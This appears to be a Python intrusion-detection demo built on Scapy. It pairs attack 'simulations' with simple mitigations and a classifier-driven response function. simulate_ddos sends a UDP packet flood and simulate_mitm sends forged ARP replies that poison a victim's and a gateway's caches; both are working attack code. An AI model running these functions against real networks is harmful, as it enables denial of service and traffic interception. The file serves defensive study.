# Simulate a DDoS attack using Scapy
from scapy.all import send, IP, UDP, ARP, TCP
import logging

logging.basicConfig(filename="intrusion_detection.log", level=logging.INFO)

# Simulate a DDoS attack
def simulate_ddos(target_ip, target_port, packet_count=1000):
    print(f"Simulating DDoS attack on {target_ip}:{target_port}...")
    for _ in range(packet_count):
        packet = IP(dst=target_ip) / UDP(dport=target_port)
        send(packet, verbose=False)
    print("DDoS simulation completed.")
    
# Simulate the Man in the Middle (MITM) attack
def simulate_mitm(victim_ip, gateway_ip, victim_mac, gateway_mac):
    print(f"Simulating MITM attack between {victim_ip} and {gateway_ip}...")
    # Poison the victim's ARP cache
    arp_victim = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip)
    # Poison the gateway's ARP cache
    arp_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip)
    send(arp_victim, verbose=False)
    send(arp_gateway, verbose=False)
    print("MITM simulation completed.")
    
    
# Mitigate DDoS attack by blacklisting IPs
def mitigate_ddos(malicious_ips, firewall_rules):
    print("Mitigating DDoS attack...")
    for ip in malicious_ips:
        firewall_rules.append(f"BLOCK {ip}")
    print(f"Blacklisted IPs: {malicious_ips}")
    
# Mitigate MITM attack by resetting connections 
def mitigate_mitm(victim_ip, attacker_ip, victim_port):
    print("Mitigating MITM attack...")
    rst_packet = IP(dst=victim_ip, src=attacker_ip) / TCP(dport=victim_port, flags="R")
    send(rst_packet, verbose=False)
    print("MITM mitigation completed.")
    
# Detect and mitigate attacks
# This function uses the model to predict attacks and applies mitigation strategies
# based on the predictions.
# The model is expected to classify traffic data into different attack types.
# The traffic_data is a list of dictionaries containing traffic information.
# The firewall_rules is a list of strings representing current firewall rules.
# The function modifies the firewall rules based on the detected attacks.
def detect_and_mitigate(model, traffic_data, firewall_rules):
    predictions = model(traffic_data)
    for i, pred in enumerate(predictions):
        if pred == "DDoS":
            mitigate_ddos([traffic_data[i]["src_ip"]], firewall_rules)
        elif pred == "MITM":
            mitigate_mitm(traffic_data[i]["victim_ip"], traffic_data[i]["attacker_ip"], traffic_data[i]["port"])
            

# Log the attack details
def log_attack(attack_type, details):
    logging.info(f"Detected {attack_type} attack: {details}")